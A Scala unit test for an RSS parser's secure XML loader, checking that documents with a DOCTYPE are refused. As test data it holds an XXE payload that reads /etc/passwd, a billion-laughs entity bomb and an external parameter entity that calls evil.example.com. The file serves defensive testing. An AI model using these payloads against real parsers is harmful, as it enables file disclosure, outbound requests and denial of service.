package me.binwang.rss.parser

import org.scalatest.funspec.AnyFunSpec
import org.scalatest.matchers.should.Matchers
import org.xml.sax.SAXParseException

import java.io.ByteArrayInputStream
import java.nio.charset.StandardCharsets

class SecureXmlSpec extends AnyFunSpec with Matchers {

  private def toInputStream(xml: String) =
    new ByteArrayInputStream(xml.getBytes(StandardCharsets.UTF_8))

  describe("SecureXml") {
    it("should parse valid XML without DOCTYPE") {
      val xml = "<root><child>text</child></root>"
      val elem = SecureXml.load(toInputStream(xml))
      elem.label shouldBe "root"
      (elem \ "child").text shouldBe "text"
    }

    it("should reject XML with DOCTYPE declaration (XXE)") {
      val xxePayload =
        """<?xml version="1.0" encoding="UTF-8"?>
          |<!DOCTYPE foo [
          |  <!ENTITY xxe SYSTEM "file:///etc/passwd">
          |]>
          |<root>&xxe;</root>""".stripMargin

      a[SAXParseException] should be thrownBy {
        SecureXml.load(toInputStream(xxePayload))
      }
    }

    it("should reject XML with billion laughs attack") {
      val billionLaughs =
        """<?xml version="1.0" encoding="UTF-8"?>
          |<!DOCTYPE lolz [
          |  <!ENTITY lol "lol">
          |  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
          |]>
          |<root>&lol2;</root>""".stripMargin

      a[SAXParseException] should be thrownBy {
        SecureXml.load(toInputStream(billionLaughs))
      }
    }

    it("should reject XML with external parameter entity") {
      val paramEntity =
        """<?xml version="1.0" encoding="UTF-8"?>
          |<!DOCTYPE foo [
          |  <!ENTITY % ext SYSTEM "http://evil.example.com/xxe">
          |  %ext;
          |]>
          |<root>test</root>""".stripMargin

      a[SAXParseException] should be thrownBy {
        SecureXml.load(toInputStream(paramEntity))
      }
    }
  }
}
